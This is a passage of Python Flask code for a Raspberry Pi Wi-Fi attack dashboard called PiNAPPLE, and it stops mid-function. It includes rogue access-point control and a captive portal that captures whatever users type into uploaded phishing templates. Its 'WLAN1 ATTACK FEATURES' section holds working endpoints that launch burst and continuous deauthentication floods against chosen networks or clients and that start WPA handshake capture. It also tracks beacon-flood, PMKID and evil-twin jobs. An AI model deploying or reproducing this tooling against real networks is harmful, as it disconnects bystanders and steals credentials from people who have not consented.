                                        handle.write(previous)
                                    subprocess.run(['systemctl', 'restart', 'pinapple-ap'],
                                                   capture_output=True, timeout=20)
                                except OSError:
                                    pass
                    else:
                        # Keep the password/security chosen by NetworkManager;
                        # only SSID and channel are safe to change here.
                        r = subprocess.run(
                            ['nmcli', 'connection', 'modify', conn,
                             '802-11-wireless.ssid', ssid,
                             '802-11-wireless.channel', str(channel)],
                            capture_output=True, text=True, timeout=15)
                        if r.returncode == 0:
                            r = subprocess.run(['nmcli', 'connection', 'up', conn],
                                               capture_output=True, text=True, timeout=25)
                        try:
                            with open(AP_TXPOWER_FILE, 'w') as f:
                                f.write(txpower)
                        except OSError:
                            pass
                    if r is not None:
                        if r.returncode != 0:
                            msg = '<span style="color:var(--red)">AP restart failed: {}</span>'.format(
                                html_escape((r.stderr or r.stdout).strip() or 'unknown'))
                        else:
                            tx_ok, tx_msg = apply_ap_txpower(txpower)
                            msg = '<span style="color:var(--grn)">Config updated and AP restarted.</span>'
                            audit('AP config updated: SSID=%s channel=%s txpower=%s'
                                  % (ssid, channel, txpower))
                            if not tx_ok:
                                msg += ' <span style="color:var(--warn)">TX power could not be applied: {}</span>'.format(
                                    html_escape(tx_msg or 'unsupported'))
        except Exception as exc:
            msg = '<span style="color:var(--red)">Error: {}</span>'.format(html_escape(str(exc)))
            audit('AP action %s failed: %s' % (action, exc), 'error')

    if backend == 'networkmanager' and not conn and not msg:
        msg = ('<span style="color:var(--red)">No NetworkManager hotspot connection was '
               'found on wlan0. Check with: nmcli connection show --active</span>')

    if backend == 'hostapd':
        cfg = read_hostapd_conf()
        try:
            with open(HOSTAPD_CONF) as f:
                raw = f.read()
        except Exception:
            raw = '# not found'
        raw_title = 'hostapd.conf'
        cur_mode = 'wpa2' if cfg.get('wpa') == '2' else 'open'
        mode_field = """<select name="mode">
    <option value="open" {sel_open}>Open</option><option value="wpa2" {sel_wpa}>WPA2-PSK</option>
  </select>""".format(sel_open='selected' if cur_mode == 'open' else '',
                       sel_wpa='selected' if cur_mode == 'wpa2' else '')
        backend_note = ''
    else:
        ssid_val = nm_connection_value(conn, '802-11-wireless.ssid') if conn else ''
        channel_val = nm_connection_value(conn, '802-11-wireless.channel') if conn else ''
        keymgmt = nm_connection_value(conn, '802-11-wireless-security.key-mgmt') if conn else ''
        cfg = {'ssid': ssid_val or 'PiNAPPLE', 'channel': channel_val or '6'}
        cur_mode = 'WPA2-PSK' if keymgmt else 'Open'
        raw = ('Managed by NetworkManager\n'
               'connection: %s\nSSID: %s\nchannel: %s\nsecurity: %s\n'
               % (conn or '(none)', cfg['ssid'], cfg['channel'], cur_mode))
        raw_title = 'NetworkManager hotspot'
        mode_field = '<select disabled><option>%s (set by NetworkManager)</option></select>' % html_escape(cur_mode)
        backend_note = ('<div class="warnbox">This install uses the NetworkManager hotspot. '
                        'SSID, channel, and TX power can be changed here. Changing the Wi-Fi '
                        'security mode or cloning a BSSID requires the hostapd stack.</div>')

    ap_run = ap_running()
    opts = ''.join('<option value="{}" {}>{}</option>'.format(
        i, 'selected' if str(i) == str(cfg.get('channel', '6')) else '', i) for i in range(1, 14))
    sel_tx = {level: ('selected' if tx_cur == level else '') for level in TX_POWER_DBM}

    mn = ('<div style="padding:12px;background:rgba(0,212,170,0.1);border-radius:8px;margin-bottom:16px">{}</div>'
          .format(msg) if msg else '')
    c = """{mn}{backend_note}<div style="display:grid;grid-template-columns:1fr;gap:24px">
<div>
<div class="sh"><span class="st">AP Configuration</span></div>
<div class="card">
<form method="POST"><input type="hidden" name="action" value="config">
<div class="fr">
  <div class="fg"><label>SSID</label><input name="ssid" value="{ssid}" maxlength="32"></div>
  <div class="fg"><label>Channel</label><select name="channel">{opts}</select></div>
</div>
<div class="fr">
  <div class="fg"><label>Mode</label>{mode_field}</div>
  <div class="fg"><label>TX Power</label><select name="txpower">
    <option value="low" {tx_low}>Low (9 dBm)</option><option value="medium" {tx_medium}>Medium (14 dBm)</option><option value="high" {tx_high}>High (20 dBm)</option>
  </select></div>
</div>
<div class="hint">Changing the SSID or channel restarts the AP and briefly disconnects every client.</div>
<button type="submit" class="btn btn-acc" style="margin-top:12px">Apply &amp; Restart</button>
</form>
<div class="warnbox">Stopping the AP will disconnect this phone from the PiNAPPLE hotspot and close the dashboard. Use Start to bring it back from a wired connection.</div>
<div style="display:flex;gap:8px;flex-wrap:wrap;">
<form method="POST" style="display:inline"><input type="hidden" name="action" value="start">
  <button class="btn btn-outline">&#9654; Start</button></form>
<form method="POST" style="display:inline" onsubmit="return confirm('Stop the PiNAPPLE AP?\\n\\nThis will disconnect this phone from the dashboard.')">
  <input type="hidden" name="action" value="stop">
  <button class="btn btn-danger">&#9632; Stop AP</button></form>
</div></div></div>
<div>
<div class="sh"><span class="st">Status</span>
  <span class="badge {apb}">{aps}</span></div>
<div class="card"><div class="card-title">{raw_title}</div>
<pre style="font-size:0.75rem;color:var(--dim);margin-top:8px;line-height:1.6;overflow-x:auto;white-space:pre-wrap">{raw}</pre>
</div></div></div>""".format(
        mn=mn, backend_note=backend_note,
        ssid=html_escape(cfg.get('ssid', 'PiNAPPLE')), opts=opts,
        mode_field=mode_field, raw=html_escape(raw), raw_title=html_escape(raw_title),
        apb='bg' if ap_run else 'br', aps='Running' if ap_run else 'Stopped',
        tx_low=sel_tx['low'], tx_medium=sel_tx['medium'], tx_high=sel_tx['high'])
    return page('AP Control', c, 'ap')

@app.route('/logs')
@require_auth
def logs_page():
    c = """<div class="sh"><span class="st">System Logs</span>
<div style="display:flex;gap:8px;flex-wrap:wrap">
<select id="ls" onchange="ul(true)" aria-label="Log source">
  <option value="all">All Logs</option>
  <option value="events">Activity</option>
  <option value="monitor">wlan1 monitor</option>
  <option value="beacon">Beacon flood</option>
  <option value="deauth">Deauth bursts</option>
  <option value="dnsmasq">dnsmasq</option>
  <option value="creds">Credentials</option>
  <option value="scan">Scanner</option>
  <option value="dashboard">Dashboard (journal)</option>
</select>
<button class="btn btn-outline" onclick="clearLog()">Clear this log</button>
</div></div>
<div class="hint" style="margin-bottom:8px">Showing the last 100 lines. Auto-refresh pauses while this tab is in the background. Credentials are saved data and are not cleared from here.</div>
<div class="log-area" id="la">Loading...</div>"""
    js = """<script>
async function ul(forceScroll){
  if(document.visibilityState!=='visible')return;
  const s=document.getElementById('ls').value;
  let d;
  try {
    const r=await fetch('/api/logs?source='+encodeURIComponent(s));
    d=await r.json();
  } catch(e){ return; }
  const a=document.getElementById('la');
  if(!a)return;
  const atBottom = forceScroll || (a.scrollTop + a.clientHeight >= a.scrollHeight - 48);
  a.innerHTML=(d.lines||[]).map(function(l){
    let c='li';const ll=l.toLowerCase();
    if(ll.includes('error')||ll.includes('fail'))c='le';
    else if(ll.includes('warn'))c='lw';
    else if(ll.includes('debug'))c='ld';
    return '<span class="'+c+'">'+esc(l)+'</span>';
  }).join('\\n');
  if(atBottom)a.scrollTop=a.scrollHeight;
}
async function clearLog(){
  const s=document.getElementById('ls').value;
  if(s==='creds'){ toast('Credentials are saved data; export or delete them from Saved.','warn',6000); return; }
  if(s==='dashboard'){ toast('Dashboard logs live in journald; use journalctl on the Pi.','warn',6000); return; }
  if(!confirm('Clear the '+s+' log(s)? This cannot be undone.'))return;
  const r=await api('/api/logs/clear','POST',{source:s});
  if(r&&r.ok){ toast('Cleared '+((r.cleared||[]).length)+' log file(s)','success'); ul(true); }
  else { toast('Could not clear logs: '+((r&&r.error)||'unknown'),'error',6000); }
}
setInterval(ul,5000);ul(true);
</script>"""
    return page('Logs', c, 'logs', js)


@app.route('/api/logs/clear', methods=['POST'])
@require_auth
def api_logs_clear():
    source = str((request.json or {}).get('source', '')).strip()
    if source in ('creds', 'dashboard'):
        return jsonify({'ok': False,
                        'error': 'This source is protected; use the Saved page or journalctl.'})
    if source == 'all':
        files = [p for p in glob.glob(os.path.join(LOG_DIR, '*.log'))
                 if os.path.basename(p) != 'creds.log']
    elif source == 'deauth':
        files = glob.glob(os.path.join(LOG_DIR, 'deauth_*.log'))
    else:
        files = {
            'events': [EVENTS_LOG],
            'monitor': [os.path.join(LOG_DIR, 'monitor.log')],
            'beacon': [os.path.join(LOG_DIR, 'beacon-flood.log')],
            'dnsmasq': [os.path.join(LOG_DIR, 'dnsmasq.log')],
            'scan': [os.path.join(LOG_DIR, 'scanner.log')],
        }.get(source)
    if files is None:
        return jsonify({'ok': False, 'error': 'unknown log source'})
    cleared = []
    base = os.path.realpath(LOG_DIR) + os.sep
    for path in files:
        real = os.path.realpath(path)
        if not real.startswith(base) or not os.path.isfile(real):
            continue
        try:
            with open(real, 'w'):
                pass
            cleared.append(os.path.basename(real))
        except OSError:
            pass
    audit('Logs cleared: %s (%d files)' % (source, len(cleared)))
    return jsonify({'ok': True, 'cleared': cleared})

@app.route('/api/logs')
@require_auth
def api_logs():
    source = request.args.get('source', 'all')
    if source == 'dashboard':
        try:
            r = subprocess.run(['journalctl', '-u', 'pinapple-dashboard', '-n', '100', '--no-pager'],
                               capture_output=True, text=True, timeout=10)
            return jsonify({'lines': r.stdout.splitlines()[-100:]})
        except Exception as exc:
            return jsonify({'lines': ['journalctl unavailable: %s' % exc]})
    if source == 'deauth':
        files = glob.glob(os.path.join(LOG_DIR, 'deauth_*.log'))
    else:
        files = {
            'all': glob.glob(os.path.join(LOG_DIR, '*.log')),
            'events': [EVENTS_LOG],
            'monitor': [os.path.join(LOG_DIR, 'monitor.log')],
            'beacon': [os.path.join(LOG_DIR, 'beacon-flood.log')],
            'dnsmasq': [os.path.join(LOG_DIR, 'dnsmasq.log')],
            'creds': [CREDS_LOG],
            'scan': [os.path.join(LOG_DIR, 'scanner.log')],
        }.get(source, [])
    lines = []
    for fp in files:
        try:
            r = subprocess.run(['tail', '-n', '50', fp], capture_output=True, text=True, timeout=5)
            lines.extend(r.stdout.splitlines())
        except Exception:
            pass
    return jsonify({'lines': lines[-100:]})

def list_portals():
    portals = []
    for path in sorted(glob.glob(os.path.join(PORTAL_DIR, '*.html'))):
        slug = os.path.splitext(os.path.basename(path))[0]
        if slug in ('index', 'success'):
            continue
        title, desc = PORTAL_LABELS.get(
            slug, (slug.replace('custom_', '').replace('_', ' ').title(),
                   'Custom uploaded template'))
        portals.append((slug, title, desc))
    if not portals:
        portals = [(slug, title, desc) for slug, (title, desc) in PORTAL_LABELS.items()]
    return portals


@app.route('/settings', methods=['GET','POST'])
@require_auth
def settings_page():
    msg = ''
    cfg = load_config()
    if request.method == 'POST':
        action = request.form.get('action')
        if action == 'portal_type':
            pt = request.form.get('portal_type', 'creds')
            valid = [p[0] for p in list_portals()]
            if pt not in valid:
                pt = 'creds'
            src = os.path.join(PORTAL_DIR, pt + '.html')
            if os.path.exists(src):
                try:
                    if os.path.lexists(ACTIVE_PORTAL):
                        os.remove(ACTIVE_PORTAL)
                    os.symlink(src, ACTIVE_PORTAL)
                    cfg['portal_type'] = pt
                    save_config(cfg)
                    subprocess.run(['systemctl', 'reload', 'nginx'],
                                   capture_output=True, timeout=10)
                except OSError as exc:
                    msg = '<span style="color:var(--red)">Could not activate template: {}</span>'.format(
                        html_escape(str(exc)))
                else:
                    audit('Portal template set to %s' % pt)
                    msg = '<span style="color:var(--grn)">Portal set to {}</span>'.format(html_escape(pt))
            else:
                msg = '<span style="color:var(--red)">That portal template no longer exists.</span>'
        elif action == 'upload_portal':
            upload = None
            files = getattr(request, 'files', None)
            if files is not None:
                upload = files.get('portal_file')
            if not upload or not upload.filename:
                msg = '<span style="color:var(--red)">Choose an HTML file to upload.</span>'
            elif not upload.filename.lower().endswith('.html'):
                msg = '<span style="color:var(--red)">The template must be a .html file.</span>'
            else:
                data = upload.read(512 * 1024 + 1)
                if len(data) > 512 * 1024:
                    msg = '<span style="color:var(--red)">Template is too large (max 512 KB).</span>'
                else:
                    low = data.lower()
                    if (b'<form' not in low or b'/portal/submit' not in low
                            or b'<input' not in low):
                        msg = ('<span style="color:var(--red)">Template must contain a form posting '
                               'to /portal/submit with at least one input.</span>')
                    else:
                        base = re.sub(r'[^a-zA-Z0-9]+', '_',
                                      os.path.splitext(upload.filename)[0]).strip('_').lower()
                        base = base[:32] or 'custom'
                        filename = 'custom_%s_%s.html' % (base, int(time.time()))
                        try:
                            with open(os.path.join(PORTAL_DIR, filename), 'wb') as handle:
                                handle.write(data)
                            os.chmod(os.path.join(PORTAL_DIR, filename), 0o644)
                            audit('Portal template uploaded: %s' % filename)
                            msg = ('<span style="color:var(--grn)">Template uploaded. '
                                   'Select it below and save.</span>')
                        except OSError as exc:
                            msg = '<span style="color:var(--red)">Could not save template: {}</span>'.format(
                                html_escape(str(exc)))
        elif action == 'password':
            pw = request.form.get('new_password', '')
            if len(pw) >= 6:
                cfg['password_hash'] = hash_password(pw)
                save_config(cfg)
                audit('Dashboard password changed', 'warn')
                msg = '<span style="color:var(--grn)">Password updated. Your browser may ask you to sign in again.</span>'
            else:
                msg = '<span style="color:var(--red)">Password must be at least 6 chars.</span>'

    portals = list_portals()
    popts = ''.join("""<label style="display:flex;align-items:center;gap:12px;padding:12px;border:1px solid var(--{bdr});border-radius:8px;cursor:pointer">
<input type="radio" name="portal_type" value="{p}" {chk}>
<div><div style="font-weight:500">{n}</div><div style="font-size:0.75rem;color:var(--dim)">{d}</div></div>
</label>""".format(p=html_escape(p), n=html_escape(n), d=html_escape(d),
                   bdr='acc' if cfg.get('portal_type') == p else 'bdr',
                   chk='checked' if cfg.get('portal_type') == p else '')
        for p, n, d in portals)

    gateway = iface_ip('wlan0') or '10.0.0.1'
    active = cfg.get('portal_type', 'creds')
    mn = '<div style="padding:12px;background:rgba(0,212,170,0.1);border-radius:8px;margin-bottom:16px">{}</div>'.format(msg) if msg else ''
    c = """{mn}<div style="display:grid;grid-template-columns:1fr;gap:24px">
<div>
<div class="sh"><span class="st">Portal Type</span>
  <span class="badge bb">{active}</span></div>
<div class="card">
<form method="POST"><input type="hidden" name="action" value="portal_type">
<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">{popts}</div>
<button type="submit" class="btn btn-acc">Save Portal Type</button>
</form>
<div class="hint">Active portal: <strong>{active}</strong> &middot; <a href="http://{gateway}/" target="_blank" rel="noopener">Preview portal</a></div>
<hr style="border-color:var(--bdr);margin:18px 0">
<div class="card-title">Upload custom portal</div>
<form method="POST" enctype="multipart/form-data">
  <input type="hidden" name="action" value="upload_portal">
  <input type="file" name="portal_file" accept=".html,text/html" style="width:100%;padding:12px;border:1px solid var(--bdr);border-radius:10px;background:var(--bg);color:var(--txt)">
  <button type="submit" class="btn btn-outline" style="margin-top:10px">Upload template</button>
</form>
<div class="hint">Expects a <code>.html</code> file containing
<code>&lt;form method="POST" action="/portal/submit"&gt;</code> with at least one
<code>&lt;input name="..."&gt;</code>. Every named field is captured as a key/value pair.
The selected template is served on the captive portal; submissions redirect to
<code>/portal/success</code>. Max 512 KB. See the README for the full contract.</div>
</div></div>
<div>
<div class="sh"><span class="st">Security</span></div>
<div class="card">
<form method="POST"><input type="hidden" name="action" value="password">
<div class="fg" style="margin-bottom:16px">
  <label>New Dashboard Password</label>
  <input type="password" name="new_password" placeholder="Min 6 characters" autocomplete="new-password">
</div>
<button type="submit" class="btn btn-acc">Change Password</button>
</form>
<div class="hint">Changing the password may make your browser ask you to sign in again. The default password is <strong>pinapple</strong> — change it before using this in public.</div></div></div></div>""".format(
        mn=mn, popts=popts, active=html_escape(str(active)), gateway=html_escape(str(gateway)))
    return page('Settings', c, 'settings')


# ============================================================
# WLAN1 ATTACK FEATURES
# ============================================================
PROBES_LOG   = '/var/log/pinapple/probes.json'
TRACKER_LOG  = '/var/log/pinapple/clients_seen.json'
BEACON_PID   = '/var/run/pinapple-beacon.pid'
BEACON_SSIDS = '/etc/pinapple/beacon_ssids.txt'
BEACON_STATUS = '/etc/pinapple/beacon_status.json'
BEACON_META  = '/etc/pinapple/beacon_meta.json'
BEACON_LOG   = '/var/log/pinapple/beacon-flood.log'
DEAUTH_PID   = '/var/run/pinapple-deauth.pid'
PMKID_PID    = '/var/run/pinapple-pmkid.pid'
EVILTWIN_PID = '/var/run/pinapple-eviltwin.pid'
PMKID_STATE  = '/var/lib/pinapple/pmkid.json'
EVILTWIN_STATE = '/var/lib/pinapple/eviltwin.json'
PCAP_DIR     = '/var/log/pinapple'


def tail_file(path, limit=1600):
    try:
        with open(path) as f:
            data = f.read()
        return data[-limit:].strip()
    except OSError:
        return ''

def load_records_file(path):
    """Read a JSON array or legacy JSON-lines file."""
    try:
        with open(path) as handle:
            raw = handle.read().strip()
        if not raw:
            return []
        if raw.startswith('['):
            data = json.loads(raw)
            return data if isinstance(data, list) else []
        out = []
        for line in raw.splitlines():
            try:
                item = json.loads(line)
                if isinstance(item, dict):
                    out.append(item)
            except ValueError:
                pass
        return out
    except (OSError, ValueError):
        return []


def get_probes():
    return load_records_file(PROBES_LOG)


def get_tracker():
    return sorted(load_records_file(TRACKER_LOG),
                  key=lambda x: x.get('last_seen', ''), reverse=True)

# ---- API ----

@app.route('/api/probes')
@require_auth
def api_probes():
    return jsonify(with_vendor(
        sorted(get_probes(), key=lambda x: x.get('last_seen', ''), reverse=True), 'mac'))

@app.route('/api/tracker')
@require_auth
def api_tracker():
    return jsonify(with_vendor(get_tracker(), 'mac'))

@app.route('/api/wlan1/mode', methods=['GET', 'POST'])
@require_auth
def api_wlan1_mode():
    """Query or switch wlan1 between managed and monitor mode."""
    owner = reconcile_wlan1_owner()
    if request.method == 'POST':
        mode = (request.json or {}).get('mode', '')
        if owner:
            label = WLAN1_OWNER_NAMES.get(owner, owner)
            return jsonify({'ok': False, 'mode': get_wlan1_mode(), 'owner': owner,
                            'error': f'wlan1 is in use by {label}. Stop it before switching mode.'})
        # Stop the recon service *before* changing the mode; otherwise its
        # socket error handler races us and puts the radio back into monitor.
        if mode == 'managed':
            stop_recon_now()
            set_monitor_service_enabled(False)
        ok, msg = set_wlan1_mode(mode)
        if not ok:
            if mode == 'managed':
                # We already stopped recon; put the radio back the way it was.
                set_monitor_service_enabled(True)
                start_recon_now()
            audit('wlan1 mode switch to %s failed: %s' % (mode, msg), 'error')
            return jsonify({'ok': False, 'mode': get_wlan1_mode(), 'owner': owner, 'error': msg})
        audit('wlan1 mode set to %s' % get_wlan1_mode())
        write_desired_wlan1_mode(mode)
        if mode == 'monitor':
            set_monitor_service_enabled(True)
            start_recon_now()
        return jsonify({'ok': True, 'mode': get_wlan1_mode(), 'owner': owner, 'message': msg})
    return jsonify({'mode': get_wlan1_mode(), 'owner': owner,
                    'owner_label': WLAN1_OWNER_NAMES.get(owner, owner) if owner else ''})


@app.route('/api/system/repair', methods=['POST'])
@require_auth
def api_system_repair():
    results = []
    for name in ('pinapple-ap', 'pinapple-dhcp', 'pinapple-portal',
                 'pinapple-monitor', 'nginx'):
        try:
            if name != 'nginx' and not unit_exists(name):
                results.append({'service': name, 'result': 'not installed'})
                continue
            if name == 'pinapple-monitor' and (reconcile_wlan1_owner() or
                                               read_desired_wlan1_mode() == 'managed'):
                results.append({'service': name,
                                'result': 'skipped (wlan1 is in managed/attack mode)'})
                continue
            r = subprocess.run(['systemctl', 'restart', name],
                               capture_output=True, text=True, timeout=25)
            results.append({'service': name,
                            'result': 'restarted' if r.returncode == 0
                            else ((r.stderr or r.stdout).strip() or 'failed')})
        except Exception as exc:
            results.append({'service': name, 'result': str(exc)})
    audit('System service repair requested', 'warn')
    return jsonify({'ok': True, 'results': results})


@app.route('/api/status/summary')
@require_auth
def api_status_summary():
    with _jobs_lock:
        deauth_modes = [job.get('mode', 'continuous') for job in _deauth_jobs.values()
                        if job['proc'].poll() is None]
    beacon = _beacon_proc[0]
    pmkid = _pmkid_proc[0]
    twin = _evil_twin_job[0]
    owner = reconcile_wlan1_owner()
    monitor_running = recon_active()
    monitor_state = read_json_file(os.path.join(LOG_DIR, 'monitor_status.json'), {})
    try:
        raw_age = monitor_state.get('updated_epoch')
        monitor_age = int(time.time() - float(raw_age)) if raw_age else None
    except (TypeError, ValueError):
        monitor_age = None
    monitor_stalled = bool(monitor_running and monitor_age is not None and monitor_age > 15)
    return jsonify({
        'wlan1_mode': get_wlan1_mode(),
        'owner': owner,
        'owner_label': WLAN1_OWNER_NAMES.get(owner, owner) if owner else '',
        'monitor': monitor_running,
        'monitor_stalled': monitor_stalled,
        'monitor_phase': monitor_state.get('state'),
        'monitor_age': monitor_age,
        'monitor_packets': monitor_state.get('packets'),
        'ap': ap_running(),
        'beacon': bool(beacon is not None and beacon.poll() is None),
        'deauth': deauth_modes,
        'pmkid': bool(pmkid is not None and pmkid.poll() is None),
        'eviltwin': bool(twin is not None and twin.poll() is None),
        'handshake': any(job.get('status') == 'running' for job in list(_hs_jobs.values())),
        'saved': len(saved_items()),
        'time': datetime.datetime.now().isoformat(timespec='seconds'),
    })

@app.route('/api/wlan1/deauth', methods=['POST'])
@require_auth
def api_deauth():
    d = request.json or {}
    bssid = str(d.get('bssid', '')).strip().upper()
    client = str(d.get('client', 'FF:FF:FF:FF:FF:FF')).strip().upper() or 'FF:FF:FF:FF:FF:FF'
    if not valid_mac(bssid) or not valid_mac(client):
        return jsonify({'ok': False, 'error': 'bssid and client must be MAC addresses'})
    try:
        count = max(1, min(int(d.get('count', 64)), 500))
        rate = max(1, min(int(d.get('rate', 20)), 200))
    except (TypeError, ValueError):
        return jsonify({'ok': False, 'error': 'count and rate must be numbers'})
    channel, error = resolve_channel(d.get('channel'), bssid)
    if error:
        return jsonify({'ok': False, 'error': error})
    if not channel:
        return jsonify({'ok': False,
                        'error': 'channel unknown: pick a channel or scan the target network first'})
    if not os.path.exists(DEAUTH_HELPER):
        return jsonify({'ok': False, 'error': 'deauth helper is not installed'}), 500

    if count / rate > 180:
        return jsonify({'ok': False,
                        'error': 'burst would take about %d seconds; raise the rate or lower the count'
                                 % (count / rate)})

    claim_wlan1('deauth')
    ok, msg = set_wlan1_mode('monitor')
    if not ok:
        release_wlan1('deauth')
        resume_recon_if_idle()
        return jsonify({'ok': False, 'error': f'Could not set wlan1 to monitor mode: {msg}'}), 500
    ok, msg = set_wlan1_channel(channel)
    if not ok:
        release_wlan1('deauth')
        resume_recon_if_idle()
        return jsonify({'ok': False, 'error': f'Could not set wlan1 channel: {msg}'}), 500

    job_id = uuid.uuid4().hex[:8]
    os.makedirs(PCAP_DIR, exist_ok=True)
    log_path = os.path.join(PCAP_DIR, 'deauth_%s.log' % job_id)
    try:
        with open(log_path, 'w') as log_handle:
            proc = subprocess.Popen(
                deauth_command(bssid, client, channel, rate, count=count),
                stdout=log_handle, stderr=subprocess.STDOUT,
                start_new_session=True)
    except OSError as exc:
        release_wlan1('deauth')
        resume_recon_if_idle()
        return jsonify({'ok': False, 'error': 'could not start deauth helper: %s' % exc}), 500

    with _jobs_lock:
        _deauth_jobs[job_id] = {
            'mode': 'burst', 'proc': proc, 'bssid': bssid, 'client': client,
            'channel': channel, 'rate': rate, 'count': count,
            'started': datetime.datetime.now().isoformat(timespec='seconds'),
            'started_epoch': time.time(), 'log': log_path,
        }
    audit('Deauth burst started: %s -> %s, %d frames at %d pps (ch %s)'
          % (bssid, client, count, rate, channel or 'auto'))
    return jsonify({'ok': True, 'status': 'started', 'job_id': job_id,
                    'bssid': bssid, 'channel': channel or None, 'rate': rate,
                    'count': count, 'estimated_seconds': round(count / rate, 1)})


@app.route('/api/wlan1/deauth/continuous/start', methods=['POST'])
@require_auth
def api_deauth_continuous_start():
    d = request.json or {}
    bssid = str(d.get('bssid', '')).strip().upper()
    client = str(d.get('client', 'FF:FF:FF:FF:FF:FF')).strip().upper() or 'FF:FF:FF:FF:FF:FF'
    if not valid_mac(bssid) or not valid_mac(client):
        return jsonify({'status': 'error', 'message': 'bssid and client must be MAC addresses'})
    try:
        rate = max(1, min(int(d.get('rate', 20)), 200))
    except (TypeError, ValueError):
        return jsonify({'status': 'error', 'message': 'rate must be a number'})
    channel, error = resolve_channel(d.get('channel'), bssid)
    if error:
        return jsonify({'status': 'error', 'message': error})
    if not channel:
        return jsonify({'status': 'error',
                        'message': 'channel unknown: pick a channel or scan the target network first'})
    if not os.path.exists(DEAUTH_HELPER):
        return jsonify({'status': 'error', 'message': 'deauth helper is not installed'}), 500

    claim_wlan1('deauth')
    stop_deauth_jobs()
    ok, msg = set_wlan1_mode('monitor')
    if not ok:
        release_wlan1('deauth')
        resume_recon_if_idle()
        return jsonify({'status': 'error', 'message': 'monitor mode failed: ' + msg})
    ok, msg = set_wlan1_channel(channel)
    if not ok:
        release_wlan1('deauth')
        resume_recon_if_idle()
        return jsonify({'status': 'error', 'message': 'channel change failed: ' + msg})

    try:
        proc = subprocess.Popen(
            deauth_command(bssid, client, channel, rate, continuous=True),
            stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
            start_new_session=True)
    except OSError as exc:
        release_wlan1('deauth')
        resume_recon_if_idle()
        return jsonify({'status': 'error', 'message': 'could not start helper: %s' % exc}), 500
    job_id = uuid.uuid4().hex[:8]
    with _jobs_lock:
        _deauth_jobs[job_id] = {
            'mode': 'continuous', 'proc': proc, 'bssid': bssid, 'client': client,
            'channel': channel, 'rate': rate,
            'started': datetime.datetime.now().isoformat(timespec='seconds'),
            'started_epoch': time.time(),
        }
    try:
        with open(DEAUTH_PID, 'w') as f:
            f.write(str(proc.pid))
    except OSError:
        pass
    audit('Continuous deauth started: %s -> %s at %d pps (ch %s)'
          % (bssid, client, rate, channel or 'auto'))
    return jsonify({'status': 'success', 'job_id': job_id,
                    'bssid': bssid, 'channel': channel or None, 'rate': rate})


@app.route('/api/wlan1/deauth/status')
@require_auth
def api_deauth_status():
    now = time.time()
    with _jobs_lock:
        # Keep finished jobs long enough for the UI to read their output,
        # then drop them so the dict does not grow forever.
        for stale_id in [k for k, j in _deauth_jobs.items()
                         if j['proc'].poll() is not None
                         and now - j.get('started_epoch', now) > 600]:
            _deauth_jobs.pop(stale_id, None)
        jobs = []
        for job_id, job in _deauth_jobs.items():
            running = job['proc'].poll() is None
            item = {
                'job_id': job_id,
                'mode': job.get('mode', 'continuous'),
                'running': running,
                'pid': job['proc'].pid,
                'bssid': job['bssid'],
                'client': job['client'],
                'channel': job['channel'] or None,
                'rate': job['rate'],
                'count': job.get('count'),
                'started': job['started'],
                'elapsed': int(now - job.get('started_epoch', now)),
            }
            if item['mode'] == 'burst':
                item['estimated_seconds'] = round((job.get('count') or 0) / max(1, job['rate']), 1)
                if not running:
                    item['output'] = tail_file(job.get('log'))
                    item['ok'] = job['proc'].returncode == 0
            jobs.append(item)
        active = any(job['running'] for job in jobs)
    orphan = None
    if not active:
        try:
            with open(DEAUTH_PID) as f:
                pid = int(f.read().strip())
            with open('/proc/%d/cmdline' % pid) as f:
                if 'pinapple-deauth' in f.read().replace('\x00', ' '):
                    orphan = {'pid': pid}
        except (OSError, ValueError):
            pass
        if orphan is None:
            release_wlan1_and_restore('deauth')
    return jsonify({'jobs': jobs, 'orphan': orphan})


@app.route('/api/wlan1/deauth/continuous/stop', methods=['POST'])
@require_auth
def api_deauth_continuous_stop():
    job_id = (request.json or {}).get('job_id')
    with _jobs_lock:
        job = _deauth_jobs.pop(job_id, None)
    if not job:
        # Allow stopping an orphan left behind by a dashboard restart.
        try:
            with open(DEAUTH_PID) as f:
                pid = int(f.read().strip())
            if safe_kill_pid(pid, 'pinapple-deauth'):
                try:
                    os.remove(DEAUTH_PID)
                except OSError:
                    pass
                release_wlan1_and_restore('deauth')
                audit('Orphaned deauth process stopped', 'warn')
                return jsonify({'status': 'success', 'orphan': True})
        except (OSError, ValueError):
            pass
        return jsonify({'status': 'error', 'message': 'Job not found'}), 404
    terminate_process_group(job['proc'])
    with _jobs_lock:
        remaining = any(j['proc'].poll() is None for j in _deauth_jobs.values())
    if not remaining:
        try:
            os.remove(DEAUTH_PID)
        except OSError:
            pass
        release_wlan1_and_restore('deauth')
    audit('Deauth job stopped: %s' % job_id)
    return jsonify({'status': 'success', 'job_id': job_id})

@app.route('/api/wlan1/handshake', methods=['POST'])
@require_auth
def api_handshake_start():
    d = request.json or {}
    bssid   = str(d.get('bssid','')).strip().upper()
    client  = str(d.get('client','FF:FF:FF:FF:FF:FF')).strip().upper() or 'FF:FF:FF:FF:FF:FF'
    if not valid_mac(bssid):
        return jsonify({'ok': False, 'error': 'a valid target BSSID is required'})
    if not valid_mac(client):
        return jsonify({'ok': False, 'error': 'client must be a MAC address or FF:FF:FF:FF:FF:FF'})
    try:
        channel = int(d.get('channel') or 6)
    except (TypeError, ValueError):
        return jsonify({'ok': False, 'error': 'channel must be a number'})
    if not 1 <= channel <= 14:
        return jsonify({'ok': False, 'error': 'channel must be between 1 and 14'})
    helper = HANDSHAKE_HELPER
    if not os.path.exists(helper):
        return jsonify({'ok': False, 'error': 'handshake helper is not installed'}), 500
    if any(j.get('status') == 'running' for j in list(_hs_jobs.values())):
        return jsonify({'ok': False, 'error': 'a handshake capture is already running'})

    prune_handshake_jobs()
    claim_wlan1('handshake')
    ok, msg = set_wlan1_mode('monitor')
    if not ok:
        release_wlan1('handshake')
        resume_recon_if_idle()
        return jsonify({'ok': False,
                        'error': f'Could not switch wlan1 to monitor mode: {msg}'}), 500

    job_id = uuid.uuid4().hex[:8]
    pcap_path = f'{PCAP_DIR}/hs_{job_id}.pcap'
    started = time.time()
    job = {'status': 'running', 'output': '', 'pcap': None, 'proc': None,
           'bssid': bssid, 'channel': channel,
           'started_epoch': started,
           'started': datetime.datetime.now().isoformat(timespec='seconds')}
    _hs_jobs[job_id] = job

    def run():
        try:
            proc = subprocess.Popen(
                [sys.executable, helper, bssid, str(channel), pcap_path, client],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, start_new_session=True)
            job['proc'] = proc
            try:
